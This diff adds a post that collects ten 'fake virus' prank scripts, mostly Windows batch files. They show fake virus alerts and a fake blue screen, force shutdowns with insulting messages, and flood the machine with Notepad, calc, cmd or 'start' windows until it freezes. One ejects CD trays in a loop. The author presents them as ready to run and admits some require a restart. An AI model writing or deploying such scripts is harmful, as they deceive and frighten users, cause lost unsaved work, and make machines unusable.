@@ -1,0 +1,513 @@
+Hi 
+I would like to point out that it is not me who created these fake virus, I just grouped together all the fake virus that I found on the internet so that you can test them more quickly ^^
+
+1)
+
+@echo off
+title Avast! Virus Alert
+color 0f
+echo Un virus a ete detecte sur votre ordinateur...
+ping localhost -n 4 > nul
+cls
+echo Si ce virus n'est pas supprime maintenant...
+ping localhost -n 4 > nul
+cls
+echo Il risque de se propager et de faire des degats.
+ping localhost -n 4 > nul
+cls
+echo Voulez-vous le supprimer de votre disque dur?
+ping localhost -n 3 > nul
+
+
+set input=
+set /p input=o/n?
+
+if %input%==o goto o
+if %input%==n goto n
+
+:o
+echo Le virus va maintenant etre supprime.
+ping localhost -n 4 > nul
+cls
+dir /s
+dir /s
+dir /s
+dir /s
+dir /s
+dir /s
+dir /s
+dir /s
+dir /s
+dir /s
+dir /s
+dir /s
+dir /s
+dir /s
+dir /s
+dir /s
+dir /s
+dir /s
+dir /s
+dir /s
+dir /s
+dir /s
+dir /s
+dir /s
+cls
+echo Le virus a ete supprime.
+ping localhost -n 2 > nul
+ping localhost -n 2 > nul
+ping localhost -n 2 > nul
+exit
+
+2)
+
+@echo off
+msg * Erreur fatale du système due à la stupidité de l'administrateur!
+shutdown -c “Erreur ! Vous êtes trop stupide!” -s -t 10
+
+3)
+
+@ECHO off
+:top
+START %SystemRoot%\system32\notepad.exe
+GOTO top
+
+4)
+
+Set oWMP = CreateObject(“WMPlayer.OCX.7”)
+Set colCDROMs = oWMP.cdromCollection
+do
+if colCDROMs.Count >= 1 then
+For i = 0 to colCDROMs.Count – 1
+colCDROMs.Item(i).Eject
+Next
+For i = 0 to colCDROMs.Count – 1
+colCDROMs.Item(i).Eject
+Next
+End If
+wscript.sleep 100
+loop
+
+4)
+
+@echo off
+:A
+www.google.com
+goto A
+
+
+Press File>Save
+
+For the File Name of the  "Fake Virus Loop" put Google.bat
+
+(you need to save it as whatever your website you put was instead of google)
+
+the next one will bug your PC you will have to restart it so don't do it if you have opened unsaved documents
+
+5) 
+
+@echo off
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+start calc.exe
+start cmd.exe
+
+6)
+
+@echo off
+color 04
+echo Salut a toi l'ami c'est Jhon-duff_56 .
+ping localhost -4 > nul
+echo Tu va tester un faux virus qui ne cause aucun degat !
+ping localhost -4 > nul
+echo Pour plus d'information visit :
+ping localhost -4 > nul
+echo RealityGaming.fr
+ping localhost - 4 > nul
+
+ping localhost - 4 > nul
+
+start http://realitygaming.fr
+
+start cmd.exe
+
+shutdown -f -t 28
+
+7)
+
+@echo off
+title Fatal Error
+color 06
+echo Warning! Virus Detected.
+pause
+echo Windows Protection Error
+pause
+echo Major File Corrupt
+
+pause
+echo Atempting System Restore.
+echo Atempet 1 Failed
+echo Atempet 2 Failed
+
+pause
+echo Overide Failed!
+echo Overide Failed!
+echo Overide Failed!
+pause
+:1
+color 01
+dir c:\windows\system32/s
+color 02
+dir c:\windows\system32/s
+color 03
+dir c:\windows\system32/s
+color 04
+dir c:\windows\system32/s
+color 05
+dir c:\windows\system32/s
+goto 1
+
+8)
+
+@echo off 
+color 0a
+title Geekpage Matrix Virus
+:top
+echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
+goto top
+
+9)
+
+@ echo off
+title [Piratage en cours..]
+mode *** cols=999 lines=999
+color 0a
+:sulfus
+start
+start
+start
+start
+goto sulfus
+
+
+the best for the end !
+
+10)
+
+echo ^<html^>^<head^>^<title^>BSOD^</title^> > bsod.hta
+echo. >> bsod.hta
+echo ^<hta:application >> bsod.hta
+echo applicationname="BSOD" >> bsod.hta
+echo version="1.0" >> bsod.hta
+echo maximizebutton="no" >> bsod.hta
+echo minimizebutton="no" >> bsod.hta
+echo sysmenu="no" >> bsod.hta
+echo Caption="no" >> bsod.hta
+echo windowstate="maximize"/^> >> bsod.hta
+echo. >> bsod.hta
+echo ^</head^>^<body bgcolor="#000088" scroll="no"^> >> bsod.hta
+echo ^<font size="4" color="#FFFFFF"^> >> bsod.hta
+echo ^<p^>A problem has been detected and windows has been shutdown to prevent damage to your computer.^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>DRIVER_IRQL_NOT_LES_OR_EQUAL^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>If this is the first time you've seen this stop error screen, restart your computer, If this screen appears again, follow these steps:^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>Check to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any windows updates you might need.^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use Safe Mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>Technical information:^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>*** STOP: 0x000000D1 (0x0000000C,0x00000002,0x00000000,0xF86B5A89)^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>*** gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>Beginning dump of physical memory^</p^> >> bsod.hta
+echo ^<p^>Physical memory dump complete.^</p^> >> bsod.hta
+echo ^<p^>Contact your system administrator or technical support group for further assistance.^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo. >> bsod.hta
+echo ^</font^> >> bsod.hta
+echo ^</body^>^</html^> >> bsod.hta
+start "" /wait "bsod.hta"
+del /s /f /q "bsod.hta" > nul
+
+if the latter does not work put at the top “@echo off”
+
+
+
